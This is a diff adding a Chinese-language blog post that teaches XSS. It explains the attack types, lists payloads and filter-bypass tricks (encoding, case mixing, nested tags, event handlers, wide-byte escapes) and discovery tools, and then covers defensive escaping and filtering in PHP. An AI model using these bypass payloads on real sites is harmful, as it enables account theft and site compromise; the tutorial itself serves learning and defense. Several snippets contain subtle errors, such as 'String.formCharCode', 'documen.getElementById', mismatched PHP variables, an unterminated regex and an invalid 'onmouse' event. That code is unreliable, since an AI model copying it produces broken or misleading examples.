@@ -434,6 +434,1034 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/30/Web_Security--XSS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/30/Web_Security--XSS/" itemprop="url">Web_Security--XSS</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-30T22:30:48+08:00">
+                2020-03-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XSS/" itemprop="url" rel="index">
+                    <span itemprop="name">XSS</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  8.5k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  36 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-XSS漏洞的基础详解"><a href="#1-XSS漏洞的基础详解" class="headerlink" title="1. XSS漏洞的基础详解"></a>1. XSS漏洞的基础详解</h4><ul>
+<li>由于web应用程序对用户的输入过滤不严而产生的</li>
+<li>攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段</li>
+<li>漏洞形成根源<ul>
+<li>服务器对用户提交数据过滤不严</li>
+<li>提交给服务器的脚本被直接返回给其他客户端执行</li>
+<li>脚本在客户端执行恶意操作</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;xss test&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">//使用xss弹出恶意警告框，代码为</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">//xss输入也可能时html代码段，如果使网页不停的刷新，代码为</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0&quot;;&gt;</span><br><span class="line">//嵌入其他网站链接的代码</span><br><span class="line">&lt;iframe src=http://cracer.com width=0 height=0&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-XSS的危害"><a href="#2-XSS的危害" class="headerlink" title="2. XSS的危害"></a>2. XSS的危害</h4><ul>
+<li>网络钓鱼，包括盗取各类的用户账号 -&gt; （反射型/存储型XSS）</li>
+<li>窃取用户cookie -&gt; 钓鱼（反射型/存储型XSS）</li>
+<li>窃取用户浏览会话 -&gt; （反射型/存储型XSS）</li>
+<li>强制弹出广告页面、刷流量 -&gt; 存储型XSS</li>
+<li>网页挂马提升用户权限，进一步渗透网站</li>
+<li>传播跨站脚本蠕虫等 -&gt; 存储型XSS</li>
+<li>点击劫持 -&gt; 通过script标签+iframe调用存在xss的页面+css样式实现</li>
+<li>篡改网页 -&gt; form元素的action属性被改为恶意网站的URL，然后进行攻</li>
+<li>通过JavaScript攻击 -&gt; 随着Ajax技术的风靡，通过JavaScript调用Web应用的各种功能的程序（API）</li>
+<li>▲ 危害一般性：存储型&gt;反射型&gt;DOM型</li>
+</ul>
+<h4 id="4-存在XSS的地方"><a href="#4-存在XSS的地方" class="headerlink" title="4. 存在XSS的地方"></a>4. 存在XSS的地方</h4><ul>
+<li>个人资料（昵称、签名、说明、邮箱、微信、qq、支付宝、银行卡）</li>
+<li>查询接口</li>
+<li>留言板</li>
+<li>url</li>
+<li>文件上传</li>
+<li>flash</li>
+<li>http头（referer、cookie、user-agent、client-ip）</li>
+<li>swf</li>
+</ul>
+<h4 id="3-JavaScript"><a href="#3-JavaScript" class="headerlink" title="3. JavaScript"></a>3. JavaScript</h4><ul>
+<li>document对象<ul>
+<li>document是一个对象，从JS一开始就存在的一个对象，它代表当前的页面（文档）</li>
+<li>js代码写入：document.write(“hello cracer”)</li>
+</ul>
+</li>
+<li>常用函数<ul>
+<li>document.write把里面的内容写到页面里</li>
+<li>document.url获取URL地址</li>
+<li>substring从某处到某处，把之间的内容获取</li>
+<li>document.url.indexof(“a=”)+2在当前URL里从开头检索a=字符，然后加2</li>
+</ul>
+</li>
+<li>javascript事件</li>
+</ul>
+<p><img src="/images/xss/Web_Security/javascript%E4%BA%8B%E4%BB%B6.png" alt="javascript事件"></p>
+<ul>
+<li>HTML中调用js的地方<ul>
+<li>标签的地方</li>
+<li>属性的地方</li>
+<li>元素/样式的地方</li>
+<li>▲ 这三个地方就可能存在XSS漏洞</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-反射型XSS"><a href="#4-反射型XSS" class="headerlink" title="4. 反射型XSS"></a>4. 反射型XSS</h4><ul>
+<li>反射型跨站脚本也称作非持久型、参数型跨站脚本，这类型的脚本是最常见的，也是使用最为广泛的一种，主要用于将恶意的脚本附加到URL地址的参数中</li>
+<li>▲ 一般使用的将构造好的URL发给受害者，使受害者点击触发，而且只执行一次，非持久化</li>
+</ul>
+<p><img src="/images/xss/Web_Security/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%B5%81%E7%A8%8B.png" alt="反射型XSS流程"></p>
+<h4 id="5-存储型XSS"><a href="#5-存储型XSS" class="headerlink" title="5. 存储型XSS"></a>5. 存储型XSS</h4><ul>
+<li>存储型XSS比反射型跨站脚本更具威胁性，并且可能影响倒web服务器的自身安全</li>
+<li>此类XSS不需要用户点击特定的URL就能执行跨站脚本，攻击者事先将恶意javascript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意的代码的页面就会执行恶意代码</li>
+</ul>
+<p><img src="/images/xss/Web_Security/%E5%AD%98%E5%82%A8XSS%E6%B5%81%E7%A8%8B.png" alt="存储型XSS流程"></p>
+<h4 id="6-DOM型XSS"><a href="#6-DOM型XSS" class="headerlink" title="6. DOM型XSS"></a>6. DOM型XSS</h4><ul>
+<li>本质是反射型，利用浏览器DOM特性，直接在本地执行修改</li>
+<li>▲ 此类漏洞难以挖掘</li>
+</ul>
+<h4 id="7-火狐中常见的XSS插件"><a href="#7-火狐中常见的XSS插件" class="headerlink" title="7. 火狐中常见的XSS插件"></a>7. 火狐中常见的XSS插件</h4><ul>
+<li>OWASP Mantra - Security Framework<ul>
+<li>OWASP出品的类同火狐浏览器</li>
+</ul>
+</li>
+<li>Hackbar<ul>
+<li>构造http包，一个常用的神器</li>
+</ul>
+</li>
+<li>Firebug<ul>
+<li>查看源代码</li>
+</ul>
+</li>
+<li>Tamper Popup<ul>
+<li>抓包</li>
+<li>clinet-ip</li>
+<li>▲ 若服务器接收客户端IP并显示，可能存在XSS漏洞</li>
+</ul>
+</li>
+<li>Live HTTP headers<ul>
+<li>修改抓包的数据</li>
+</ul>
+</li>
+<li>Editor Cookie<ul>
+<li>编辑Cookie信息</li>
+</ul>
+</li>
+<li>Cookie Manage<ul>
+<li>Cookie信息的管理者</li>
+</ul>
+</li>
+</ul>
+<h4 id="8-XSS漏洞手工挖掘"><a href="#8-XSS漏洞手工挖掘" class="headerlink" title="8. XSS漏洞手工挖掘"></a>8. XSS漏洞手工挖掘</h4><ul>
+<li>反射型是：输入–输出 / 存储型是：输入–进入数据库*–取出数据库–输出。</li>
+<li>寻找思路差别<ul>
+<li>反射型是：绝大部分情况下，输入在哪里，输出就在哪里</li>
+<li>存储型是：输入在A处进入数据库， 而输出则可能出现在其它任何用到数据的地方。</li>
+<li>反射型是：输入大部分位于地址栏或来自DOM的某些属性，也会偶尔有数据在请求中（POST类型）</li>
+<li>存储型是：输入大部分来自POST/GET请求，常见于一些保存操作中</li>
+</ul>
+</li>
+<li>⭐ 寻找存储型：输出的位置不一定出现在输入的位置（逆向思维）<ul>
+<li>先找到输出点，然后猜测此处输出是否会被过滤</li>
+<li>如果觉得可能没过滤，我们再找到这个输出是在哪里输入的</li>
+<li>接着开始测试输入，看输出的效果</li>
+<li>如果没过滤，那么你就成功了，否则你可以放弃掉它</li>
+</ul>
+</li>
+<li>⭐ 寻找反射型（正向思维）<ul>
+<li>一个站点<a href="http://example.com" target="_blank" rel="noopener">http://example.com</a></li>
+<li>在目标站点上找到输入点</li>
+<li>输入一组”特殊字符（单引号，双引号，尖括号等）+唯一识别字符（字母数字组合）”，点击提交后，查看返回的源码，是否有对应的处理</li>
+<li>通过搜索定位到唯一识别字符，结合唯一识别字符的前后语法确认是否可以构造执行js的条件（是否能构造闭合）</li>
+<li>提交构造的脚本代码（以及各种绕过姿势），看是否成功执行，如果成功执行说明存在xss漏洞</li>
+</ul>
+</li>
+<li>⭐ 标签的闭合<ul>
+<li>标签中间 -&gt; <code>&lt;/td&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li>标签属性中间 -&gt;<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li>▲ 最好是闭合加载后的标签，留言后的标签也可以尝试</li>
+<li>▲ 若标签限制了maxlength，可通过修改进行绕过，若修改不了长度或写入不了代码，可通过抓包写入代码或修改长度</li>
+</ul>
+</li>
+<li>常用的payload<ul>
+<li>特殊字符：<code>&#39;&quot;&lt;&gt;666</code></li>
+<li>弹窗：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li>大小写：<code>&lt;sCrIpt&gt;alert(1)&lt;/ScrIpt&gt;</code></li>
+<li>重复标签：<code>&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></li>
+<li>重复script：<code>&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code></li>
+<li>HTML实体编码：<code>&amp;#x3C;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3E;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x3C;&amp;#x2F;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3E;</code>（一般用于反射型XSS，用于HTML代码）</li>
+<li>Unicode编码：<code>\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e</code>（一般用于DOM型XSS，用于JS代码）</li>
+<li>JavaScript字符串方法：<code>String.formCharCode(97,108,101,114,116,40,34,88,83,34,41,59)</code>（用于绕过magic_quotes_gpc，用来把ASCII转换为字符串）</li>
+<li>onclick事件：<code>&lt;img src=x onclick=alert(1)&gt;</code></li>
+<li>onload事件：<code>&lt;img src=x onload=alert(1)&gt;</code>（一般用于img的自动加载）</li>
+<li>onerror事件：<code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+<li>onmouse事件：<code>&lt;img src=x onmouse=alert(1)&gt;</code></li>
+<li>href属性：<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code></li>
+<li>src属性：<code>&lt;img src=&quot;javascript:alert(1)&quot;&gt;</code></li>
+<li>注释+伪协议：<code>javascrip&amp;#x74;:alert(1)//http://</code></li>
+<li>隐藏表单：<code>&quot; type=&quot;txt&quot; value=&quot;q&quot; onclick=&quot;alert(1)</code></li>
+<li>/混淆形式：<code>&lt;img/src=@ onerror=alert(1)&gt;</code></li>
+</ul>
+</li>
+<li>常用绕过方法论<ul>
+<li>/**/混淆过滤规则来绕过过滤函数，用注释符来做分隔符，替换空格</li>
+<li>script，/，’’等都被转换成&amp;nbsp，可以用换行符%0a，%0d来进行绕过</li>
+<li>eval()函数来替换被过滤的alert()</li>
+<li>appendChild(createElement(‘script’)).src=’js_url’来绕过对src的限制</li>
+<li>注释 -&gt; 换行输出</li>
+<li>\ -&gt; javascript，字符串允许下面多行的写法，可以用\来使进行多行输出</li>
+<li>\ -&gt; 转义：\ -&gt; gbxxx编码系列 -&gt;  %c0可以吃掉%5c</li>
+<li>js代码eval(‘alert(1)’);voids来进入绕过对<code>&lt;&gt;</code>的过滤，此类常用于<code>&lt;script&gt;&lt;/script&gt;</code>标签之内</li>
+<li>宽字节绕过<ul>
+<li>gbxxxx系列的编码 / 过滤：%22 -&gt; %5c%22</li>
+<li>%c0%22 -&gt; %c0%5c%22 -&gt; %22 -&gt; %c0吃掉%5c</li>
+</ul>
+</li>
+<li>优先级：function()函数 &gt;  == &gt; &amp;</li>
+</ul>
+</li>
+<li>编码绕过<ul>
+<li>URL只允许用US-ASCII字符集中可打印的字符(0×20—0x7x)<ul>
+<li>编码方式：字符改成%+ASCII两位十六进制(先把字符串转成ASCII编码，然后再转成十六进制)</li>
+<li>+加号代表URL编码的空格，%20也是</li>
+<li>&amp;-&gt; %26, # -&gt; %23</li>
+</ul>
+</li>
+<li>利用字符编码，javascript支持unicode、escapes、十六进制、八进制等编码形式<ul>
+<li>&lt;不光可以写为\u003c，还可以写为\x3c，&gt;同样可以写为\x3e，空格可以表示为\u0020</li>
+</ul>
+</li>
+<li>html编码<ul>
+<li>编码方式：&amp;#加十进制、十六进制ASCII码或unicode字符编码</li>
+<li>浏览器解析的时候会先把html编码解析再进行渲染</li>
+<li>▲ 编码必须在”值”里，比如属性src里，但却不能对src进行html编码。不然浏览器无法正常的渲染</li>
+</ul>
+</li>
+<li>CSS编码<ul>
+<li>编码方式：/斜杠加上1-6位十六进制</li>
+<li>\ 反斜线，而css里，允许使用转义字符，+ascii16进制形式</li>
+<li>▲ IE5之前都可以用expression来调用js时</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>⭐ 闭合标签（⭐ 属性内）<ul>
+<li><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li><code>&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li><code>q&quot; onclick=&quot;alert(1)</code></li>
+<li><code>javascrip&amp;#x74;:alert(1)//http://</code></li>
+<li>▲ payload中的重复，大小写等都适用于属性里面的内容，而不单单只属于标签</li>
+</ul>
+</li>
+<li>▲ 其他的一些，不外乎上面的payload+闭合标签，更多的payload已经上传到云服务器</li>
+<li>▲ 更老的一些payload例子，可以查看XSS靶场–WooYun.tencent</li>
+<li>经验之谈<ul>
+<li>一般查询接口容易出现反射性xss,留言板容易出现存储型xss</li>
+<li>标签一般是看加载后的HTML页面 / 属性值一般是看加载后属性中的值</li>
+</ul>
+</li>
+</ul>
+<h4 id="9-XSS漏洞工具挖掘"><a href="#9-XSS漏洞工具挖掘" class="headerlink" title="9. XSS漏洞工具挖掘"></a>9. XSS漏洞工具挖掘</h4><ul>
+<li>⭐ 尽量不要尝试POST型的闭合，可能导致页面扭曲歪曲，特别是存储型XSS</li>
+<li>avws</li>
+<li>netspark</li>
+<li>appscan</li>
+<li>burp</li>
+<li>xsser</li>
+<li>xsscrapy</li>
+<li>brutexssr<ul>
+<li>python脚本编写，命令行执行</li>
+<li>get/post请求方式，通过wordlist去尝试</li>
+</ul>
+</li>
+<li>OWASP Xenotix XSS Exploit Framework<ul>
+<li>setting -&gt; start（xook.js中存放有几千条xss代码）</li>
+<li>Scanner -&gt; GET -&gt; 粘贴地址 -&gt; 字段加入[x] -&gt; Fuzz</li>
+<li>Scanner -&gt; POST -&gt; Burpsuite抓包黏贴Request Header -&gt; 指定字段 -&gt; Fuzz</li>
+</ul>
+</li>
+<li>▲ 工具的使用暂不介绍</li>
+</ul>
+<h4 id="10-常见的防XSS对策"><a href="#10-常见的防XSS对策" class="headerlink" title="10. 常见的防XSS对策"></a>10. 常见的防XSS对策</h4><ul>
+<li>参数所在位置及相应的转义方法</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">位置</th>
+<th align="center">说明</th>
+<th align="center">最低限度的转义内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">元素内容</td>
+<td align="center">能解释Tag和字符实体</br>结束边界符为”&lt;”</td>
+<td align="center">“&lt;”和”&amp;”使用字符实体转义</td>
+</tr>
+<tr>
+<td align="center">属性值（双引号中的内容）</td>
+<td align="center">能解释字符实体</br>结束边界符为双引号</td>
+<td align="center">属性值使用双引号括起来，”&lt;”和”&amp;”和”””使用字符实体转义</td>
+</tr>
+<tr>
+<td align="center">属性值（URL）</td>
+<td align="center">同上</td>
+<td align="center">检测URL格式正确后按照属性值的规则转义</td>
+</tr>
+<tr>
+<td align="center">事件绑定函数</td>
+<td align="center">同上</td>
+<td align="center">转义JavaScript后按照属性值得规则转义</td>
+</tr>
+<tr>
+<td align="center">script元素中的字符串字面量</td>
+<td align="center">不能解释Tag和字符实体</br>结束边界符为”&lt;”</td>
+<td align="center">转义JavaScript应避免出现”&lt;/“</td>
+</tr>
+</tbody></table>
+<ul>
+<li>htmlspecialchars()函数</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">转换前</th>
+<th align="center">转换后</th>
+<th align="center">ENT_NOQUOTES</th>
+<th align="center">ENT_COMPAT</th>
+<th align="center">ENT_QUOTES</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">&lt;</td>
+<td align="center"><code>&amp;lt;</code></td>
+<td align="center">√</td>
+<td align="center">√</td>
+<td align="center">√</td>
+</tr>
+<tr>
+<td align="center">&gt;</td>
+<td align="center"><code>&amp;gt;</code></td>
+<td align="center">√</td>
+<td align="center">√</td>
+<td align="center">√</td>
+</tr>
+<tr>
+<td align="center">&amp;</td>
+<td align="center"><code>&amp;amp;</code></td>
+<td align="center">√</td>
+<td align="center">√</td>
+<td align="center">√</td>
+</tr>
+<tr>
+<td align="center">“</td>
+<td align="center"><code>&amp;quot;</code></td>
+<td align="center">×</td>
+<td align="center">√</td>
+<td align="center">√</td>
+</tr>
+<tr>
+<td align="center">‘</td>
+<td align="center"><code>&amp;#39;</code></td>
+<td align="center">×</td>
+<td align="center">×</td>
+<td align="center">√</td>
+</tr>
+</tbody></table>
+<ul>
+<li>JavaScript字符串字面量应被转义的字符</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">字符</th>
+<th align="center">转义后</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">|\</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">‘</td>
+<td align="center">&#39;</td>
+</tr>
+<tr>
+<td align="center">“</td>
+<td align="center">&quot;</td>
+</tr>
+<tr>
+<td align="center">换行</td>
+<td align="center">\n</td>
+</tr>
+</tbody></table>
+<ul>
+<li>指定响应的字符编码<ul>
+<li>如果Web应用与浏览器各自设想的字符编码不一致，也会成为XSS的原因</li>
+<li>header(‘Content-Type: text/html; charset=UTF-8’);</li>
+</ul>
+</li>
+<li>输入校验<ul>
+<li>通过检验输入值的有效性，当输入不符合条件时就显示错误消息并促使用户重新输入，有时也能够防御XSS攻击</li>
+</ul>
+</li>
+<li>给Cookie添加HttpOnly属性<ul>
+<li>Cookie中有名为HttpOnly的属性，该属性能禁止JavaScript读取Cookie值</li>
+<li>php.ini中进行设置：session.cookie_httponly = on</li>
+</ul>
+</li>
+<li>关闭TRACE方法<ul>
+<li>跨站追踪（Cross-Site Tracing，简称XST）攻击的防范策略。XST是指利用JavaScript发送HTTP的TRACE方法来窃取Cookie值或Basic认证密码的攻击手段</li>
+<li>实际上，现在的主流浏览器都已经能够自己防御XST</li>
+<li>关闭TRACE方法，在httpd.conf的设置 TraceEnable Off</li>
+</ul>
+</li>
+<li>生成URL时的对策<ul>
+<li>当URL由程序动态生成时，需要对其进行校验，仅允许http和https协议</li>
+<li>URL需满足下列的两个条件中的一个<ul>
+<li>以http:或https:开头的绝对URL</li>
+<li>以/开头的相对URL</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function check_url($url)&#123;</span><br><span class="line">    if(preg_match(&apos;/\Ahttp:/&apos;,$url)||preg_match(&apos;/\Ahttps:/&apos;,$url)|preg_match(&apos;#\A/#&apos;,$url))&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>校验链接网址<ul>
+<li>检查链接的目标URL，如果指向外部网站就报错</li>
+<li>当链接目标为外部URL时，显示一个警告页面以提醒用户可能存在的分享</li>
+</ul>
+</li>
+<li>对JavaScript字符串字面量动态生成进行Unicode转义<ul>
+<li>JavaScript能将Unicode代码点U+XXXX字符转义为\uXXXX的功能</li>
+<li>escape_js_string函数，但前提是字符编码为UTF-8，除了字母和数字以外，减号（-）和点好（.）也不进行转义</li>
+<li>unicode_escape函数的功能将输入字符串全部以\uXXXX的UNICODE形式进行转义</li>
+<li>在mb_convert_encoding中将输入字符串的字符编码转换为UTF-16</li>
+<li>在bin2hex中将对象字符串转换为十六进制</li>
+<li>使用正则表达式，每4个字节插入一个\u</li>
+<li>在pre_replace_callback函数中，将字母和数字以外的字符串全部传给unicode_escape函数处理</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">   // 将字符串全部转换为 /uXXXX形式</span><br><span class="line">   function unicode_escape($match)&#123;</span><br><span class="line">      $u16 = mb_convert_encoding($matches[0],&apos;UTF-16&apos;);</span><br><span class="line">      return preg_replace(&apos;/[0-9a-f]&#123;4&#125;&apos;,&apos;\u$0&apos;,bin2hex($u16));</span><br><span class="line">   &#125;</span><br><span class="line">   // 将除了字母、数字、逗号和点号外的字符转义为\uXXXX形式</span><br><span class="line">   function escape_js_string($s)&#123;</span><br><span class="line">      return preg_replace_callback(&apos;/[^-\.0-9a-zA-Z]+/u&apos;,&apos;unicode_escape&apos;,$s);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在JavaScript中引用定义在script元素外的参数的方法<ul>
+<li>在script元素外部定义参数后再在JavaScript中引用该参数也可以，不过需要利用hidden参数</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; id=&quot;familyname&quot; value=&quot;&lt;?php echo htmlspecialchars($familyname,ENT_COMPAR,&apos;UTF-8&apos;);?&gt;&quot;&gt;</span><br><span class="line">.....</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">var familyname = documen.getElementById(&apos;familyname&apos;).value;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用JQuery的JavaScript库来对JavaScript字符串字面量动态生成进行转义<ul>
+<li>使用span元素确定字符串的显示位置，然后向id指定的DOM插入文本文字，这时可以使用text方法自动进行转义操作</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=&quot;jquery-1.4.4.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">你好&lt;span id=&quot;name&quot;&gt;&lt;/span&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">if(document.URL.match(/name\=([^&amp;]*)/))&#123;</span><br><span class="line">    var name = unescape(RegExp.$1);</span><br><span class="line">    $(&apos;#name&apos;).text(name);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>允许HTML标签或CSS的对策<ul>
+<li>使用地点：常见于开发博客系统或SNS网站</li>
+<li>一旦允许输入HTML标签，就有可能出现JavaScript的执行</li>
+<li>在CSS中使用expression功能也能执行JavaScript<ul>
+<li>IE8的标准中就禁用了expression功能执行JavaScript，但在其他模式中还可以使用</li>
+</ul>
+</li>
+<li>为了避免JavaScript的执行，可以采取解析用户输入的HTML，仅允许可以显示的元素的方法，可以通过解析HTML文本语法结构的第三方程序库，如PHP的HTML Purifier</li>
+</ul>
+</li>
+</ul>
+<h4 id="11-常见的防XSS代码"><a href="#11-常见的防XSS代码" class="headerlink" title="11. 常见的防XSS代码"></a>11. 常见的防XSS代码</h4><ul>
+<li><code>preg_replace(&quot;/script/&quot;,&quot;&quot;,$x)</code> -&gt; 正则匹配替换，区分大小写</li>
+<li><code>preg_replace(&quot;/script/i&quot;,&quot;&quot;,$x)</code> -&gt; 正则匹配替换，不区分大小写</li>
+<li><code>preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] )</code> -&gt; 正则匹配替换</li>
+<li>htmlspecialchars()函数 -&gt; 默认的第二个参数不对单引号进行转义</li>
+<li>strtolower()函数 -&gt; 将字符串转为小写</li>
+<li>strpos()函数 -&gt; 找寻字符串<ul>
+<li><code>strpos($str,&#39;http://&#39;)</code></li>
+<li><code>strpos($str,&#39;https://&#39;)</code></li>
+</ul>
+</li>
+<li>str_replace()函数 -&gt; 第一个参数为被替换的内容，第二个参数为替换的内容<ul>
+<li><code>str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str)</code></li>
+<li><code>str_replace(&quot;on&quot;,&quot;o_n&quot;,$str)</code></li>
+<li><code>str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str)</code></li>
+<li><code>str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str)</code></li>
+<li><code>str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str)</code></li>
+<li><code>str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str)</code></li>
+<li><code>str_replace(&quot;script&quot;,&quot;&quot;,$str)</code></li>
+<li><code>str_replace(&quot;on&quot;,&quot;&quot;,$str)</code></li>
+<li><code>str_replace(&quot;src&quot;,&quot;&quot;,$str)</code></li>
+<li><code>str_replace(&quot;data&quot;,&quot;&quot;,$str)</code></li>
+<li><code>str_replace(&quot;href&quot;,&quot;&quot;,$str)</code></li>
+<li><code>str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str)</code></li>
+<li><code>str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str)</code></li>
+<li><code>str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str)</code></li>
+<li><code>str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str)</code></li>
+<li><code>str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str)</code></li>
+<li><code>str_replace(&quot;&gt;&quot;,&quot;&quot;,$str)</code></li>
+<li><code>str_replace(&quot;&lt;&quot;,&quot;&quot;,$str)</code></li>
+</ul>
+</li>
+<li>hidden表单形式</li>
+<li>addslashes()函数 -&gt; 在每个特殊字符前加反斜杠（\）</li>
+<li>strip_tags()函数 -&gt; 剥去字符串中的 HTML、XML以及PHP的标签</li>
+<li>stripos()函数 -&gt; 查找字符串在另一字符串中第一次出现的位置，本函数处于循环中，意味着每一个<code>&lt;script</code>都会被替换，且不区分大小写</li>
+<li>stripcslashes() -&gt; 去掉反斜杠</li>
